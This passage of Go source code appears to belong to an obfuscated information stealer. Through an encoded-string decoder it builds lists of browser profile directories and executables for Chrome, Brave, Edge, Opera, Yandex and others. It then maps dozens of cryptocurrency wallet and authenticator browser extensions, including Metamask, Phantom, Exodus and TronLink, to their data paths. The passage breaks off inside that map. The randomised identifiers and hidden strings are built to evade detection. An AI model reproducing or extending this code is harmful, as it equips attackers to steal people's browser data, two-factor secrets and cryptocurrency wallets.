		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a4956dfb3d67c0f19f69cc609cfebd5a0c56d326dfef874175f82bac")), "Profile_5", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a4957afc3772ddbdaa3b965acda96b110cc72dd4427022382455f0abb0d8adef")), "Guest Profile", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("ae091c6581efa7be24d5eb3d1c93b5913ff4766e349a53a49518fced336248a3900d8d3f67a5c83583"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("ac101a658fbc9bb736fdd9380993b58b3cf4762f50b542aaa761dc2164dbbdbe288d5df8816b2b5fd260716c0a296b3b76159627237df326fabba042")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("ac101a658fbc9bb736fdd9380993b58b3cf4762f50b542aaa761dc2164dbbdbe288d5df81c9b3a6dc992e742333df50a1071809c"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("ac101a658fbc9bb736fdd9380993b58b3cf4762f50a853a4ab51ec0e96919846af2c04e9603cab0341746e72")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("ac101a658fbc9bb736fdd9380993b58b3cf4762f50a853a4ab51ec0e96919846af2c04e9603cab0341746e72"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("ac101a658fbc9bb736fdd9380993b58b3cf4762f50bc7fe59a49e8306dccc1c239dd3066c2259dbda66f5816718738")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("a2302f53afc88957305affc98c063b943ad234004a8b15")), Cijosgmviuhoepbatohaaytukfezbopl("ac101a658fbc9bb736fdd9380993b58b3cf4762f50bc7fe59a49e8306dccc1c239dd3066c2259dbda66f5816718738"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a49579ec3460dcf18e15a0e1ea13ddbf975d421bbac9f772271a")), "Default", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4952c3e96b696c56ab0edc0d1840a824f94"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4956dfb3d67c0f19f69c8608e731ec7cdcda35ea9315623438c5d8c")), "Profile_1", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4952c3e96b696c56ab0edc0d1840a824f94"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4956dfb3d67c0f19f69cb6001f6990d684f8ad6131059dd4ab984c7")), "Profile_2", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4952c3e96b696c56ab0edc0d1840a824f94"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4956dfb3d67c0f19f69ca607b75e44b0b319251850f5c88b25533fe")), "Profile_3", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4952c3e96b696c56ab0edc0d1840a824f94"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4956dfb3d67c0f19f69cd60dcfd9698234bd9c76752462158d23650")), "Profile_4", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4952c3e96b696c56ab0edc0d1840a824f94"))},
		{filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4956dfb3d67c0f19f69cc60a67eebde4035c140f14d4374a03e8169")), "Profile_5", filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a00f1c5481ff949a22e6d92a1e84b5913ff4766e349a53a4952c3e96b696c56ab0edc0d1840a824f94"))}}
	browserrootPaths := [][]string{
		{"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "Chrome Default"},
		{"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", "Brave Default"},
		{"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "Edge Default"},
		{"C:\\Program Files\\Opera\\opera.exe", "Opera Default"},
		{"C:\\Program Files\\Vivaldi\\Application\\vivaldi.exe", "Vivaldi Default"},
		{"C:\\Program Files\\Yandex\\YandexBrowser\\Application\\browser.exe", "Yandex Default"},
		{"C:\\Program Files (x86)\\CocCoc\\Browser\\Application\\browser.exe", "CocCoc Default"},
		{"C:\\Program Files\\Ungoogled Chromium\\Application\\chrome.exe", "Ungoogled Chromium"},
		{"C:\\Program Files\\Epic Privacy Browser\\Application\\epic.exe", "Epic Privacy Browser"},
		{"C:\\Program Files\\Blisk\\Application\\blisk.exe", "Blisk Default"},
	}
	browserInfo := cuwuwomsnolbfmlybrlgqzwverlxqzbp(browserrootPaths)
	browserInfoStr := strings.Join(browserInfo, Cijosgmviuhoepbatohaaytukfezbopl("e9318a2e3786fdb4f942fb63af5ade47d2"))

	walletPaths := map[string]string{
		"Metamask":        filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c68865d35ac4be001549e8c7f02db70834946e20fc8f6155ec82cf2fe5f08033ec742404a5a9c7d0856068ca28816a9b")),
		"Coinbase":        filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c08d61db5cc9b20a1948eccdf720b6043f926124f98d6d59ef8ac33becfa8f39988c7630a3a75d039216b9098770c7b7")),
		"Cara":            filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c5876dd754c6ba031e4de4ccfe20be093f9f6529e78f685aeb81ce3ee6fd8839be1b62d31be8f97325d4e796eaf1f128")),
		"BinanceChain":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8b65d55acbb1041f42ebcdf932b8023a9d6c2df9876659e894c63bedff842d6cfed646e5e4a6e0d5076c78d687bebe")),
		"Phantom":         filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cf8b65d75cccb60a154be2d2fc2db703369f6627fb8e6b55ed88c733eaf08634ebc1aeb5613c3b29b1c9e899c01cca7c")),
		"TronLink":        filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c18169df58c6ba0f1743e2d2f22cbe103d936322fa8e6e58ec8bc137edfd8b3e7853cd510baf3374225ff15681ab175a")),
		"Ronin":           filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8d6dd25fc9b40d1745ebc8fa29b30236956b20f98f6256ee8bcf3decfe8b3e6c6f65d8eb7fc03e411105ed75bdaff3")),
		"Exodus":          filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c98b68d642c4b80c1b42e3c5fb24ba0f35986025fd826850e38dcc33e1ff80326613a2cc7c229d18f827999f98fb2263")),
		"Coin98":          filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c98666d95ac9b2081f48f9caf432b103319e662cf88f6d54e28bc630e7fe833a5571310977b0710a05721677731ee8a8")),
		"Authenticator":   filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a61a8052c7e54b354ac2627659fa75f9cbec24ccdf4be0309bbfc0846fd553cfbd15194af9c0fe2aa20831966721f8816153e08ad834e0fa87c9a177ec9c4495a8ff057b996d36a8b0")),
		"MathWallet":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a61a8052c7e54b354ac2627659fa75f9cbec24ccdf4be0309bbcce8164d858d2be151c4fedcefa2fba0d3b9d6025f2856a53e485c53ce4f78d9b74ec2955c4483eba1718910c06277e")),
		"YoroiWallet":     filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8569d857ceba01154be0cdf927bc0b32986a20fa81615de081c035eafa843fe1c9ab9e8f2e11cfa2b44a76c550fe50")),
		"GuardaWallet":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c09360d654cabb031446ebc5e128b605369b6f23f3876a52e085d82fe3fd8233f32fce2f7084db1a22114a85aaddea48")),
		"JaxxxLiberty":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cb8962d654d2b015164bebc6fb28b70e349d7824f482695ae38fce3ce4fd80381bca15969ed59ef510ec6b9d918e658d")),
		"Wombat":          filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c98e6cd758c8b1081c42edc6fe25bf08289b6421fe8d6c47eb8bce31e4f187353ec60b4fc90bcf4bd26a6e01b1b111fb")),
		"EVERWallet":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cb8462df5dc6ac031b49e3c1f427b4093d976423f386755ff988c33aecf7883622271110e5ffb64630badbb4df68ec0a")),
		"KardiaChain":     filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481d88766de58c9ba0e1d4de8c4f620b105319c6b3ef58b645be782c63af2f980361a249405b8b7d33680b3fee7b307308c")),
		"XDEFI":           filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c08e62d550ccba0b1c4de4c6fa26b10d34936429f6876851f982ca30ebfe8f3bbadbb5a25ef2dae34f026ccae691c30b")),
		"Nami":            filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c49361d950c8b70b1344f9c7f42bbe0c31976625fe8b6259ea8dc338e4f38a320e4e47346d13b667c3c52dc539ccd674")),
		"TerraStation":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c98a6edc50ccbe03154cf9cff427b90928996d2bfe8a6c5aed94c633f2fc9e2d2900f0eaafa3588c5e2a85688fd48806")),
		"MartianAptos":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cd8565dd5ec5b3031547f9d2f325b10a3d816626fe826956e086cb31e1f78936eac51543689bb133fc067fe85fe0e356")),
		"TON":             filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c6936fca5ed2bb0a1b45e1cafb21ba0b33996527f087645ce08ec634eafd80399ccc1b66c8dea0e7dcc1fbb7c8334d29")),
		"Keplr":           filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cc8e6cdb5fc1b70b1549e2c5f226b40830936c2af4876d56ea8cc33ae8fe8f2d2be406505fd928f37ec73d3a6b7db312")),
		"CryptoCom":       filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c08a61db54c5b106194af9c7fa32be0f359b6225f4866258ed8ac03ce7f78237a4f7865c1295bc8bd858b379feba4744")),
		"PetraAptos":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cd896dd653c6b50b144de2c6f628b70d3d9a6d2cf3906058e286c134eafd8d3491bef25caac1a20a29bc1895c501e898")),
		"OKX":             filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c58068d25bceb2061848e8caf32fb504329a6a3ef28d6654e08dc733e5f8893854c117ac77ded9d7b19a253a42e4e5b3")),
		"Sollet":          filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8b6adc57ccb8021e41eacff220bf06319a6c2df8876a51f98cc132ecf08032e6dafab4868d8081d5d7a8033e71e9f5")),
		"Sender":          filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cd9366ca5bcab815164fe3c1f52cbc0b3c94612fff8c625eee8bce33edf28c3a1808a7452c2e06039545438fbe405175")),
		"Sui":             filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c79364dd42c4b10c0a47edc0f632b70e309c6924f8816f47eb8bca2ff2ff8731d81736a1edb659b94ee8541f4230612b")),
		"SuietSui":        filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c38b77d142c0be06194dedcffc21be0d28986f2af0846156eb81c133e9ff9e396d8f992647b7f9635ee5b7d0ba1ba92f")),
		"Braavos":         filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c28d6bdd53cfb906185ee4c0f028b806309c6523fb88605de281c53ae8ff833c5b07f94dfba024db55c456d299eed02d")),
		"FewchaMove":      filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cd8161d356d2ac09124febc7f426a20e309b6621f5876d58e294c136edf48237c6ab8fcfdc598d04158cf7d4d4963997")),
		"EthosSui":        filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c58065d355cfb60c1b48ecc5fb2cbc0f3f946c27f8856251ef86c730ebfc8234816f03847f75a7fa1c55625728525bd5")),
		"ArgentX":         filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481cc8f64d550d2b60c1349f9cbfa2dbd023799652ff5856d5fe48cce30edff8c3f332566f892a1c96d0e54b9a85a6a2305")),
		"NiftyWallet":     filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c28163db5dc1b2001347e0ccfc28b00a34966922ff83605bee86cd35eff58739dd0012f922b632b86bcb64c15da1ccd5")),
		"BraveWallet":     filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c78765dc42c7b90c124ae2c0f82abf0f289a6a24fa8f6a59ef85c633e0fd8d31748aeeacc4b2c077442a7e225d110925")),
		"EqualWallet":     filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ca8f69d357cbb5031c4ce6cbfd2eb90e329f6d3ef8876f5fe283c630e3eb8f3eb91e0a425e6b7553277cf4a64b833ae9")),
		"BitAppWallet":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8a6fd153c9ba0a1845e4c9fb2db8103b997828f083685fef8ec632ecfd9e3420ae4d7e2322636d13682349103f7605")),
		"iWallet":         filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c38d64d95ac6b502154ceecaf42cb00239956c21fd8a6b59e88bcf39f2eb8837468bab7accc93b8f927771b1d4660960")),
		"AtomicWallet":    filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481ce8b6ed653cab90c1749e5cbf62cb604339b6f21f18b6655ee81c337e7f58c35287c404e4e4d671e2dc130d460ad5f89")),
		"MewCx":           filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c68f65d75cccb50f1940e5c7f629b80a28926e24f48c6854ef83cf39e7fd8a304b66b2aa38b48e5a0b7ab4a51958f43a")),
		"GuildWallet":     filepath.Join(os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("af2f3c56a2dd988814c8fa18f88d437fc762e8ad88b21556ae4e56ec")), Cijosgmviuhoepbatohaaytukfezbopl("a40f107082f9949b38fbc1341eaabcb729e3240a118f46998d58ef3374c5e9a605965fc5a92e0846d3696b43fc74b7b8da35ccc24ce924b481c68269d05fc6b70b1245e0ccf824bc0b3f956b29f0836359e180c93eeff6833787564530f88ad6d079adac5aad7c1f6e")),
